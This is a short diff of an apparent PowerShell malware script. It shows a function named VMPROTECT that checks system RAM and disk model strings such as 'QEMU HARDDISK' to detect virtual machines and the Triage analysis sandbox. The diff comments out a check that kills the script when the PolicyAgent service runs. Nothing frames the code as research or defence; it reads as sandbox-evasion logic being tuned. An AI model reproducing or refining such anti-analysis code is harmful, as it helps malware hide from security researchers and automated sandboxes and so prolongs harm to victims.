@@ -124,10 +124,10 @@ function ram_check {
 
 function VMPROTECT {
 	ram_check	  
-	if (Get-Service -Name "PolicyAgent" -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq "Running" }) {
-        ShowError "PolicyAgent"
-        Stop-Process $pid -Force
-    } 	
+	#if (Get-Service -Name "PolicyAgent" -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq "Running" }) {
+    #    ShowError "PolicyAgent"
+    #    Stop-Process $pid -Force
+    #} 	
     #triage detection
     $d = wmic diskdrive get model
     if ($d -like "*DADY HARDDISK*" -or $d -like "*QEMU HARDDISK*") { 
